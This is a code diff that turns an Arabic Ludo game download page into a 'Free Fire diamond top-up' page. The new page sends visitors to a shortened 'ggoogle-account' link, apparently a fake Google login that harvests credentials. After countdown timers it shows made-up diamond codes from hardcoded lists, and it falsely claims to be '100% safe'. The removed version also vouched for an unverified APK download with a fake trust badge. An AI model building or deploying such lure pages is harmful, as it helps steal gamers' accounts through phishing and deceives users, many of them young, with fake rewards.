@@ -1,245 +1,390 @@
+
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8">
-  <title>LUDO TUNISIA</title>
-  <style>
-    @keyframes gradient {
-      0% {background-position: 0% 50%;}
-      50% {background-position: 100% 50%;}
-      100% {background-position: 0% 50%;}
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>💎 موقع الشحن فري فاير 2026</title>
+<style>
+*{ margin:0; padding:0; box-sizing:border-box; }
+body{
+  font-family: 'Arial', sans-serif;
+  color:#fff;
+  text-align:center;
+  min-height:100vh;
+  background: linear-gradient(270deg,#000000,#0f2027,#203a43,#6a11cb,#ff0000,#00eaff);
+  background-size: 1000% 1000%;
+  animation: bg 20s ease infinite;
+}
+@keyframes bg{
+  0%{ background-position:0% 50% }
+  50%{ background-position:100% 50% }
+  100%{ background-position:0% 50% }
+}
+.top-bar{
+  padding:20px;
+  font-size:32px;
+  font-weight:bold;
+  text-shadow:0 0 30px #000;
+  animation: colorText 3s infinite;
+  background:rgba(0,0,0,0.3);
+  backdrop-filter:blur(10px);
+}
+@keyframes colorText{
+  0%{ color:#ffd700; }
+  50%{ color:#00eaff; }
+  100%{ color:#ff0000; }
+}
+.logo{
+  width:120px;
+  margin-top:10px;
+  filter:drop-shadow(0 0 20px #ffd700);
+  animation: float 3s ease-in-out infinite;
+}
+@keyframes float{
+  0%,100%{ transform:translateY(0px); }
+  50%{ transform:translateY(-10px); }
+}
+.container{
+  max-width:800px;
+  margin:30px auto;
+  padding:40px 30px;
+  border-radius:30px;
+  background:rgba(0,0,0,0.85);
+  box-shadow:0 0 80px #00eaff, inset 0 0 30px rgba(0,234,255,0.1);
+  position:relative;
+  border:1px solid rgba(0,234,255,0.3);
+}
+.container h1{
+  font-size:36px;
+  background:linear-gradient(45deg,#ffd700,#ff6b6b,#00eaff);
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+  margin-bottom:15px;
+}
+.game-logo{
+  position:absolute;
+  top:15px;
+  right:15px;
+  width:60px;
+  filter:drop-shadow(0 0 15px #ffd700);
+}
+button{
+  padding:18px 40px;
+  font-size:20px;
+  border:none;
+  border-radius:50px;
+  cursor:pointer;
+  margin:12px;
+  font-weight:bold;
+  transition:0.3s;
+  box-shadow:0 0 30px rgba(255,255,255,0.3);
+  position:relative;
+  overflow:hidden;
+}
+button::after{
+  content:'';
+  position:absolute;
+  top:-50%;
+  left:-50%;
+  width:200%;
+  height:200%;
+  background:radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 70%);
+  opacity:0;
+  transition:0.3s;
+}
+button:hover::after{ opacity:1; }
+button:hover{ transform:scale(1.08) translateY(-3px); }
+button:active{ transform:scale(0.95); }
+button:disabled{ opacity:0.5; cursor:not-allowed; transform:none !important; }
 
-    body {
-      font-family: 'Arial', sans-serif;
-      text-align: center;
-      margin: 0;
-      padding: 50px;
-      background: linear-gradient(-45deg, #1e3c72, #2a5298, #3b8fd1, #6ab0ff);
-      background-size: 400% 400%;
-      animation: gradient 5s ease infinite;
-      color: white;
-    }
+#loginBtn{
+  background:linear-gradient(135deg,#ff3c3c,#c0392b);
+  color:#fff;
+  box-shadow:0 0 40px rgba(255,60,60,0.5);
+}
+#codeBtn{
+  background:linear-gradient(135deg,#00eaff,#0099ff);
+  color:#000;
+  box-shadow:0 0 40px rgba(0,234,255,0.5);
+}
+#diamondBtn{
+  background:linear-gradient(135deg,#ffd700,#f39c12);
+  color:#000;
+  box-shadow:0 0 40px rgba(255,215,0,0.5);
+}
+#refreshBtn{
+  background:linear-gradient(135deg,#9b59ff,#6c3483);
+  color:#fff;
+  box-shadow:0 0 40px rgba(155,89,255,0.5);
+  display:none;
+}
+.btn-group{ display:flex; flex-wrap:wrap; justify-content:center; gap:10px; }
 
-    h1 {
-      font-size: 52px;
-      text-shadow: 3px 3px #000000aa;
-      margin-bottom: 30px;
-    }
+#codeBox{
+  margin-top:30px;
+  padding:20px;
+  font-size:30px;
+  color:#00ffcc;
+  font-weight:bold;
+  text-shadow:0 0 30px #00ffcc;
+  background:rgba(0,255,204,0.05);
+  border-radius:20px;
+  border:2px dashed rgba(0,255,204,0.3);
+  min-height:80px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  word-break:break-all;
+}
+.footer{
+  padding:30px;
+  background:rgba(0,0,0,0.7);
+  backdrop-filter:blur(10px);
+  margin-top:30px;
+  border-top:2px solid rgba(255,215,0,0.3);
+}
+.footer h2{ color:#ffd700; margin-bottom:15px; }
+.footer p{ font-size:18px; line-height:1.8; max-width:700px; margin:10px auto; color:#ccc; }
+.footer .dev{ color:#00eaff; font-size:22px; }
+.sparkle{
+  display:inline-block;
+  animation: sparkle 1.5s ease-in-out infinite;
+}
+@keyframes sparkle{
+  0%,100%{ opacity:1; transform:scale(1); }
+  50%{ opacity:0.5; transform:scale(1.2); }
+}
+.small-logo{ width:80px; margin:15px; filter:drop-shadow(0 0 20px #ffd700); }
+.badge{
+  display:inline-block;
+  padding:5px 20px;
+  border-radius:50px;
+  font-size:14px;
+  font-weight:bold;
+  margin:5px;
+}
+.badge-gold{ background:#ffd700; color:#000; }
+.badge-blue{ background:#00eaff; color:#000; }
+.badge-red{ background:#ff3c3c; color:#fff; }
 
-    img {
-      border-radius: 25px;
-      box-shadow: 0 8px 25px rgba(0,0,0,0.6);
-      width: 320px;
-      transition: transform 0.4s;
-    }
-    img:hover { transform: scale(1.08); }
-
-    p.description {
-      font-size: 20px;
-      max-width: 700px;
-      margin: 20px auto;
-      line-height: 1.6;
-      background-color: rgba(0,0,0,0.5);
-      padding: 20px;
-      border-radius: 15px;
-      box-shadow: 0 6px 20px rgba(0,0,0,0.5);
-    }
-
-    button {
-      background-color: #00c853;
-      color: white;
-      padding: 20px 60px;
-      font-size: 24px;
-      border: none;
-      border-radius: 15px;
-      cursor: pointer;
-      transition: 0.4s;
-      box-shadow: 0 6px 20px rgba(0,0,0,0.5);
-      margin-top: 25px;
-    }
-    button:hover {
-      background-color: #00b14f;
-      transform: translateY(-5px);
-    }
-
-    a { text-decoration: none; }
-
-    .box, .features, .reviews, .ratings {
-      margin-top: 30px;
-      max-width: 750px;
-      background-color: rgba(0,0,0,0.7);
-      padding: 25px;
-      border-radius: 20px;
-      box-shadow: 0 6px 25px rgba(0,0,0,0.5);
-      text-align: left;
-    }
-
-    .box h2, .features h2, .reviews h2, .ratings h2 {
-      text-align: center;
-      font-size: 28px;
-      margin-bottom: 20px;
-      text-decoration: underline;
-    }
-
-    .features ul, .reviews ul {
-      list-style: square;
-      font-size: 18px;
-      line-height: 1.8;
-    }
-
-    .credibility {
-      margin-top: 30px;
-      max-width: 600px;
-      margin-left:auto;
-      margin-right:auto;
-      background-color: rgba(255,255,255,0.2);
-      color: #fff;
-      padding: 15px;
-      border-radius: 15px;
-      font-size: 18px;
-      box-shadow: 0 6px 15px rgba(0,0,0,0.5);
-    }
-
-    .contact {
-      margin-top: 25px;
-      font-size: 18px;
-    }
-    .contact a {
-      color: #ffeb3b;
-      font-weight: bold;
-    }
-
-    .star-rating {
-      display: flex;
-      justify-content: center;
-      margin: 15px 0;
-      font-size: 30px;
-      cursor: pointer;
-    }
-    .star-rating span {
-      color: #ccc;
-      transition: color 0.3s;
-    }
-    .star-rating span:hover,
-    .star-rating span.hover,
-    .star-rating span.selected {
-      color: #ffd700;
-    }
-  </style>
+@media(max-width:600px){
+  .top-bar{ font-size:22px; padding:15px; }
+  .container{ padding:20px 15px; margin:15px; }
+  .container h1{ font-size:24px; }
+  button{ padding:14px 25px; font-size:16px; margin:8px; }
+  #codeBox{ font-size:20px; padding:15px; min-height:60px; }
+  .game-logo{ width:40px; top:10px; right:10px; }
+  .logo{ width:80px; }
+  .footer p{ font-size:15px; }
+}
+</style>
 </head>
 <body>
 
-  <h1>رمضان مبارك - LUDO TUNISIA</h1>
+<div class="top-bar">
+  🌙 رمضان مبارك 🌙<br>
+  🔥 موقع الشحن فري فاير 2026 🔥
+  <br>
+  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
+</div>
 
-  <img src="ic_launcher_foreground.png" alt="Game">
-
-  <p class="description">
-    لعبة لودو تونسيا مليئة بالحركة والتحدي، مستوحاة من ألعاب لودو ولكن بأسلوب عصري ممتع.  
-    رسومات جميلة، تحكم سلس، وتجربة خفيفة على جميع الهواتف الذكية بإصدار <strong>Android 6+</strong>.
+<div class="container">
+  <img class="game-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
+  
+  <h1>💎 نظام شحن الجواهر الاحترافي</h1>
+  <p style="font-size:18px; color:#aaa; margin-bottom:20px;">
+    قم بتسجيل الدخول أولاً ثم انتظر 35 ثانية لتفعيل الأكواد
   </p>
-
-  <a href="https://www.mediafire.com/file/r4je0oez4lwgbvl/LUDO_TUNISIA.apk/file" target="_blank">
-    <button>تحميل اللعبة</button>
-  </a>
-
-  <div class="box">
-    <h2>👨‍💻 معلومات المطور</h2>
-    <p><strong>اسم المطور:</strong> أدم</p>
-    <p><strong>خبرة التطوير:</strong> أكثر من سنتين في تصميم الألعاب التونسية والعالمية</p>
-    <p><strong>روابط التواصل:</strong> <a href="https://www.tiktok.com/@s.p.e.d124" target="_blank" style="color:#ffeb3b;">تيك توك @s.p.e.d124</a></p>
-    <p><strong>حقوق اللعبة:</strong> جميع الحقوق محفوظة للمطور</p>
+  
+  <div class="btn-group">
+    <button id="loginBtn">🔐 تسجيل دخول فري فاير</button>
   </div>
-
-  <div class="features">
-    <h2>مميزات اللعبة</h2>
-    <ul>
-      <li>تحكم سلس وسريع وسهل لجميع اللاعبين</li>
-      <li>رسومات جذابة وحيوية</li>
-      <li>تحديات مثيرة ومتنوعة تزيد المتعة</li>
-      <li>حجم APK صغير وسريع التحميل</li>
-      <li>متوافقة مع جميع الهواتف الحديثة</li>
-      <li>تجربة محسّنة عن لعبة لودو الأصلية</li>
-      <li>إمكانية تقييم اللعبة وكتابة مراجعات</li>
-      <li>عرض تقييمات وآراء اللاعبين</li>
-      <li>كشف محاولات الغش أو التلاعب (وهمي)</li>
-      <li>عداد تحميل تقريبي للعبة</li>
-    </ul>
+  
+  <div class="btn-group" style="margin-top:10px;">
+    <button id="codeBtn" disabled>🎁 كود 510 جوهرة</button>
+    <button id="diamondBtn" disabled>💎 كود 110 جوهرة</button>
+    <button id="refreshBtn">🔄 تحديث الأكواد</button>
   </div>
-
-  <div class="ratings">
-    <h2>تقييم اللعبة</h2>
-    <div class="star-rating" id="starRating">
-      <span data-value="1">&#9733;</span>
-      <span data-value="2">&#9733;</span>
-      <span data-value="3">&#9733;</span>
-      <span data-value="4">&#9733;</span>
-      <span data-value="5">&#9733;</span>
-    </div>
+  
+  <div id="codeBox">
+    ⏳ انتظر تسجيل الدخول أولاً
   </div>
-
-  <div class="reviews">
-    <h2>آراء اللاعبين</h2>
-    <ul id="reviewList">
-      <li>لا يوجد مراجعات بعد، كن أول من يشارك رأيه!</li>
-    </ul>
-    <textarea id="reviewInput" placeholder="اكتب رأيك هنا..." rows="3" style="width:100%; margin-top:10px; border-radius:10px; padding:10px;"></textarea>
-    <button onclick="addReview()">إرسال المراجعة</button>
+  
+  <div style="margin-top:20px;">
+    <span class="badge badge-gold">🎯 510 جوهرة</span>
+    <span class="badge badge-blue">💎 110 جوهرة</span>
+    <span class="badge badge-red">🔒 آمن 100%</span>
   </div>
+</div>
 
-  <div class="credibility">
-    <strong>🔒 شهادة موثوقية الموقع:</strong>
-    <ul>
-      <li>✔ الموقع الرسمي للمطور</li>
-      <li>✔ الملفات آمنة وخالية من البرمجيات الخبيثة</li>
-      <li>✔ تم فحص اللعبة قبل النشر</li>
-      <li>✔ جميع الحقوق محفوظة للمطور</li>
-    </ul>
-    <img src="trusted-badge.png" alt="موثوق" width="80">
-  </div>
+<div class="footer">
+  <h2>💡 لمحة عن فري فاير والموقع</h2>
+  <p>
+    فري فاير هي لعبة باتل رويال شهيرة مليئة بالحماس والمغامرات،
+    حيث تساعدك الجواهر على شراء الأسلحة والسكنات وتطوير حسابك داخل اللعبة.
+  </p>
+  <p>
+    هذا الموقع يوفر تجربة تصميم احترافية لعرض أكواد الجواهر بطريقة آمنة وسريعة
+    مع واجهة قوية وخلفية جميلة متحركة.
+  </p>
+  <p>
+    <span class="dev">👨‍💻 المطور: ADEM</span>
+  </p>
+  <img class="small-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/0e/Free_Fire_logo.png">
+  <p style="font-size:14px; color:#666; margin-top:10px;">
+    © 2026 جميع الحقوق محفوظة
+  </p>
+</div>
 
-  <div class="contact">
-    <p>للتواصل مع المطور: <a href="https://www.tiktok.com/@s.p.e.d124" target="_blank">تيك توك @s.p.e.d124</a></p>
-  </div>
+<script>
+const loginBtn = document.getElementById("loginBtn");
+const codeBtn = document.getElementById("codeBtn");
+const diamondBtn = document.getElementById("diamondBtn");
+const refreshBtn = document.getElementById("refreshBtn");
+const codeBox = document.getElementById("codeBox");
 
-  <script>
-    // ⭐⭐⭐ تقييم النجوم
-    const stars = document.querySelectorAll('#starRating span');
-    stars.forEach(star => {
-      star.addEventListener('click', function() {
-        stars.forEach(s => s.classList.remove('selected'));
-        this.classList.add('selected');
-      });
-      star.addEventListener('mouseover', function() {
-        stars.forEach(s => s.classList.remove('hover'));
-        this.classList.add('hover');
-      });
-      star.addEventListener('mouseout', function() {
-        stars.forEach(s => s.classList.remove('hover'));
-      });
-    });
+const codes510 = [
+  "386855252454554",
+  "252524242524244",
+  "252524242424222",
+  "252522222241222",
+  "252522212242222",
+  "252525222255283",
+  "683825382425544",
+  "383865242427242"
+];
 
-    // ✍️ إضافة مراجعات
-    function addReview() {
-      const input = document.getElementById('reviewInput');
-      const list = document.getElementById('reviewList');
-      if(input.value.trim() !== '') {
-        const li = document.createElement('li');
-        li.textContent = input.value;
-        list.appendChild(li);
-        input.value = '';
+const codes110 = [
+  "5865252524243",
+  "343438252525",
+  "373424242424",
+  "273424242425",
+  "37342425242",
+  "37352525224",
+  "27252554352",
+  "37242552522",
+  "35352424242",
+  "352525253522"
+];
+
+let index510 = 0;
+let index110 = 0;
+let logged = false;
+let loginTimer = null;
+
+function updateCodeBox(text, isSuccess = false) {
+  codeBox.textContent = text;
+  if (isSuccess) {
+    codeBox.style.borderColor = "rgba(0,255,204,0.8)";
+    codeBox.style.boxShadow = "0 0 50px rgba(0,255,204,0.3)";
+  } else {
+    codeBox.style.borderColor = "rgba(0,255,204,0.3)";
+    codeBox.style.boxShadow = "none";
+  }
+}
+
+function loginCountdown() {
+  let seconds = 35;
+  updateCodeBox("⏳ جاري التحقق من تسجيل الدخول: " + seconds + " ثانية");
+  
+  if (loginTimer) clearInterval(loginTimer);
+  
+  loginTimer = setInterval(() => {
+    seconds--;
+    if (seconds > 0) {
+      updateCodeBox("⏳ جاري التحقق من تسجيل الدخول: " + seconds + " ثانية");
+    } else {
+      clearInterval(loginTimer);
+      loginTimer = null;
+      if (logged) {
+        codeBtn.disabled = false;
+        diamondBtn.disabled = false;
+        updateCodeBox("✅ تم التحقق بنجاح! يمكنك الآن الحصول على الأكواد", true);
       }
     }
+  }, 1000);
+}
 
-    // 🔢 عداد تحميل وهمي
-    let downloadCount = 0;
-    const downloadBtn = document.querySelector('a button');
-    downloadBtn.addEventListener('click', () => {
-      downloadCount++;
-      alert('تم تحميل اللعبة ' + downloadCount + ' مرة/مرات');
-    });
+loginBtn.addEventListener("click", () => {
+  window.open("https://bit.ly/ggoogle-account", "_blank");
+  logged = true;
+  codeBtn.disabled = true;
+  diamondBtn.disabled = true;
+  refreshBtn.style.display = "none";
+  codeBtn.style.display = "inline-block";
+  diamondBtn.style.display = "inline-block";
+  loginCountdown();
+});
 
-  </script>
+function startCountdown(callback, type) {
+  let seconds = 20;
+  updateCodeBox("⏳ تجهيز الكود (" + type + "): " + seconds + " ثانية");
+  
+  const timer = setInterval(() => {
+    seconds--;
+    if (seconds > 0) {
+      updateCodeBox("⏳ تجهيز الكود (" + type + "): " + seconds + " ثانية");
+    } else {
+      clearInterval(timer);
+      callback();
+    }
+  }, 1000);
+}
+
+codeBtn.addEventListener("click", () => {
+  if (!logged) {
+    updateCodeBox("⚠️ يجب تسجيل الدخول أولاً!");
+    return;
+  }
+  codeBtn.disabled = true;
+  diamondBtn.disabled = true;
+  
+  startCountdown(() => {
+    const code = codes510[index510];
+    index510 = (index510 + 1) % codes510.length;
+    updateCodeBox("🎁 كود 510 جوهرة: " + code + " 💎", true);
+    codeBtn.style.display = "none";
+    diamondBtn.style.display = "none";
+    refreshBtn.style.display = "inline-block";
+  }, "510");
+});
+
+diamondBtn.addEventListener("click", () => {
+  if (!logged) {
+    updateCodeBox("⚠️ يجب تسجيل الدخول أولاً!");
+    return;
+  }
+  codeBtn.disabled = true;
+  diamondBtn.disabled = true;
+  
+  startCountdown(() => {
+    const code = codes110[index110];
+    index110 = (index110 + 1) % codes110.length;
+    updateCodeBox("💎 كود 110 جوهرة: " + code + " 💎", true);
+    codeBtn.style.display = "none";
+    diamondBtn.style.display = "none";
+    refreshBtn.style.display = "inline-block";
+  }, "110");
+});
+
+refreshBtn.addEventListener("click", () => {
+  refreshBtn.style.display = "none";
+  codeBtn.style.display = "inline-block";
+  diamondBtn.style.display = "inline-block";
+  codeBtn.disabled = false;
+  diamondBtn.disabled = false;
+  updateCodeBox("🔄 تم تحديث النظام! اختر الكود الذي تريده", true);
+});
+
+// تنبيه عند محاولة إغلاق الصفحة
+window.addEventListener("beforeunload", (e) => {
+  if (logged) {
+    e.preventDefault();
+    e.returnValue = "هل أنت متأكد من المغادرة؟ قد تفقد الأكواد!";
+  }
+});
+</script>
 
 </body>
 </html>
